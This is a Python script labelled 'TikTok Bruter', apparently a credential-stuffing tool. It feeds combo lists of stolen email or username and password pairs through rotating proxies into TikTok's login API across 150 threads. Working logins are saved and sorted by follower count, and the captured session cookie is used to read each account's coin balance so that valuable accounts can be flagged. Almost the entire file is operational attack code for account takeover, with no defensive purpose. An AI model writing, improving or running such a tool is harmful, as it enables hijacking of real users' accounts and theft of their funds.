import hashlib
import os
import random
import re
import requests
import secrets
import threading
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from colorama import Fore, init
from user_agent import generate_user_agent  # pip install user_agent

init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')

lock = threading.Lock()
proxy_lock = threading.Lock()

combos = []
proxies = []
proxy_index = 0

Success = 0
BAD = 0
retries = 0
twofa = 0
secured = 0  # New secured counter

cmb = input(" @Black_A7a | TikTok Bruter\n\n [+] Put Combo: ")
prro = input(" [+] Put Proxies File (or type 'proxyless'): ")
print("—" * 60)

SAVE_DIR = "/storage/emulated/0/CR7SUIIII"
os.makedirs(SAVE_DIR, exist_ok=True)

# Load combos
try:
    with open(cmb, "r", encoding="utf-8", errors="ignore") as f:
        combos_raw = [line.strip() for line in f if line.strip()]
    combos = []
    for line in combos_raw:
        if line.count(":") == 1:
            combos.append(line)
        else:
            with lock:
                BAD += 1
except FileNotFoundError:
    print("[!] Combo file not found.")
    exit()
except Exception as e:
    print(f"[!] Error reading combo file: {e}")
    exit()

# Load proxies (optional)
if prro.lower() == "proxyless":
    proxies = []
    print("[+] Running in PROXYLESS mode.")
else:
    try:
        with open(prro, "r", encoding="utf-8", errors="ignore") as f:
            proxy_lines = [line.strip() for line in f if line.strip()]
        if not proxy_lines:
            print("[!] Proxy list is empty. Running proxyless.")
            proxies = []
        else:
            for proxy in proxy_lines:
                if proxy.count(":") == 3:
                    host, port, user, pwd = proxy.split(":")
                    proxies.append(f"{user}:{pwd}@{host}:{port}")
                else:
                    proxies.append(proxy)
            print(f"[+] Loaded {len(proxies)} proxies.")
    except FileNotFoundError:
        print("[!] Proxy file not found. Running proxyless.")
        proxies = []
    except Exception as e:
        print(f"[!] Error loading proxies: {e}. Running proxyless.")
        proxies = []


def generate_device_id():
    return str(random.randint(10**17, 10**18 - 1))


def hash_data(email):
    salt = "aDy0TUhtql92P7hScCs97YWMT-jub2q9"
    to_hash = email + salt
    return hashlib.sha256(to_hash.encode()).hexdigest()


def xor(value: str) -> str:
    try:
        return "".join([hex(ord(char) ^ 5)[2:] for char in value])
    except Exception:
        return ""


def get_next_proxy():
    global proxy_index
    if not proxies:  # proxyless mode
        return None
    with proxy_lock:
        proxy = proxies[proxy_index % len(proxies)]
        proxy_index += 1
        if "@" in proxy:
            creds, host = proxy.split("@", 1)
            user, pwd = creds.split(":", 1)
            proxy_url = f"http://{quote(user)}:{quote(pwd)}@{host}"
        else:
            proxy_url = f"http://{proxy}"
        return {"http": proxy_url, "https": proxy_url}


def get_profile_info(username):
    url = f"https://www.tiktok.com/@{username}"
    headers = {
        "User-Agent": generate_user_agent(),
    }

    for _ in range(10):
        try:
            proxies_dict = get_next_proxy()
            if proxies_dict:
                response = requests.get(url, headers=headers, proxies=proxies_dict, timeout=10)
            else:
                response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                html = response.text
                try:
                    data_part = html.split('''"userInfo":{"user":{''')[1].split('''</sc''')[0]
                    followers = data_part.split('"followerCount":')[1].split(',')[0]
                    likes = data_part.split('"heart":')[1].split(',')[0]
                    return followers, likes
                except Exception:
                    continue
        except Exception:
            continue
    return "N/A", "N/A"


def coincap(sessionid):
    cookies = {
        'sessionid': sessionid,
        'store-idc': 'alisg',
        'tt-target-idc': 'alisg',
    }
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'origin': 'https://www.tiktok.com',
        'priority': 'u=1, i',
        'referer': 'https://www.tiktok.com/',
        'user-agent': generate_user_agent(),
    }
    params = {'aid': '1988'}

    try:
        response = requests.get(
            'https://webcast.tiktok.com/webcast/wallet_api/fs/diamond_buy/permission_v2',
            params=params,
            cookies=cookies,
            headers=headers,
            timeout=100
        )
        if response.status_code == 200:
            match = re.search(r'"coins_balance":(.*?),', response.text)
            if match:
                return match.group(1)
        return "N/A"
    except requests.exceptions.RequestException:
        return "N/A"


def save_hit(user, password, username, followers, likes, coins):
    try:
        followers_int = int(followers)
    except Exception:
        followers_int = -1

    if 0 <= followers_int <= 999:
        filename = "0-999.txt"
    elif 1000 <= followers_int <= 4999:
        filename = "1000-4999.txt"
    elif 5000 <= followers_int <= 20000:
        filename = "5000-20000.txt"
    else:
        filename = "Others.txt"

    path = os.path.join(SAVE_DIR, filename)
    line = f"{user}:{password} | Username: {username} | Followers = {followers} | Likes: {likes} | Coins: {coins}\n"
    with open(path, "a", encoding="utf-8") as f:
        f.write(line)

    try:
        if coins != "N/A" and int(coins) >= 25:
            high_path = os.path.join(SAVE_DIR, "HighCoins.txt")
            with open(high_path, "a", encoding="utf-8") as f_high:
                f_high.write(line)
    except Exception:
        pass


def save_secured(user, password, followers=None, likes=None):
    path = os.path.join(SAVE_DIR, "TikTok-Secured.txt")
    with open(path, "a", encoding="utf-8") as f:
        if followers is not None and likes is not None:
            f.write(f"{user}:{password} | Followers = {followers} | Likes = {likes}\n")
        else:
            f.write(f"{user}:{password} | SECURED\n")


def update_stats():
    sys.stdout.write(
        f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {Success} | {Fore.RED}Bad{Fore.WHITE}: {BAD} | "
        f"{Fore.YELLOW}Retries{Fore.WHITE}: {retries} | {Fore.CYAN}2FA{Fore.WHITE}: {twofa} | "
        f"{Fore.LIGHTYELLOW_EX}Secured{Fore.WHITE}: {secured} "
    )
    sys.stdout.flush()


def login(user, password, device_id):
    global Success, BAD, retries, twofa, secured

    csrf_token = secrets.token_hex(10)
    login_field = "email" if "@" in user else "username"

    params = (
        f"device_id={device_id}&aid=8311&account_sdk_source=web&sdk_version=2.1.9"
        f"&verifyFp=verify_me2z7w93_9NhGFbAb_uPKw_40SH_BXs0_a5tdIf0CMDpe"
        f"&sign=3339f691c664e92be4248790682c037c78abf224e96cbe45f8b5080251d0d901"
        f"&qs=6466666a706b715a76616e5a766a707766602964c61296160736c66605a6c612976616e5a736077766c6a6b297360776c637c4375"
    )

    url = f"https://api16-normal-c-alisg.tiktokv.com/passport/web/user/login/?{params}"
    data = (
        f"mix_mode=1&{login_field}={xor(user)}&password={xor(password)}"
        f"&fp=verify_{device_id}&verifyFp=verify_{device_id}&device_id={device_id}"
        f"&language=en&multi_login=1&fixed_mix_mode=1"
    )

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"passport_csrf_token={csrf_token}; passport_csrf_token_default={csrf_token}",
        "X-Tt-Passport-Csrf-Token": csrf_token,
        "referer": "https://www.tiktok.com/ucenter_web/live_studio/login",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) TikTokLIVEStudio/0.89.0 Chrome/108.0.5359.215 "
                      "Electron/22.3.18-tt.11.release.main.48 Safari/537.36",
        "x-argus": "x",
        "x-khronos": "x",
        "x-ladon": "x"
    }

    for _ in range(10000):
        try:
            proxies_dict = get_next_proxy()
            if proxies_dict:
                response = requests.post(url, params=params, headers=headers, data=data, proxies=proxies_dict, timeout=15)
            else:
                response = requests.post(url, params=params, headers=headers, data=data, timeout=15)

            sessionid = None
            if response.cookies:
                sessionid = response.cookies.get("sessionid")

            try:
                response_data = response.json()
            except Exception:
                response_data = {}

            if "data" in response_data and "verify_ticket" in response_data["data"]:
                with lock:
                    secured += 1
                    if "@" not in user:
                        username = response_data.get("data", {}).get("username", user)
                        followers, likes = get_profile_info(username)
                        save_secured(user, password, followers, likes)
                    else:
                        save_secured(user, password)
                    update_stats()
                return True

            if "data" in response_data and "session_key" in response_data["data"]:
                username = response_data["data"].get("username", user)
                followers, likes = get_profile_info(username)

                coins = "N/A"
                if sessionid:
                    coins = coincap(sessionid)

                with lock:
                    save_hit(user, password, username, followers, likes, coins)
                    Success += 1
                    update_stats()
                return True

            elif "2-step" in response.text:
                with lock:
                    with open("2fa.txt", "a", encoding="utf-8") as f:
                        f.write(f"{user}:{password}\n")
                    twofa += 1
                    update_stats()
                return True
            else:
                with lock:
                    BAD += 1
                    update_stats()
                return False

        except requests.RequestException:
            with lock:
                retries += 1
                update_stats()
            continue

    with lock:
        BAD += 1
        update_stats()
    return False


def worker(combo):
    if ":" not in combo:
        with lock:
            global BAD
            BAD += 1
            update_stats()
        return
    parts = combo.split(":", 1)
    if len(parts) != 2:
        with lock:
            BAD += 1
            update_stats()
        return

    user, password = parts
    device_id = generate_device_id()
    try:
        login(user, password, device_id)
    except Exception:
        with lock:
            BAD += 1
            update_stats()


if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=150) as executor:
        executor.map(worker, combos)
    print()
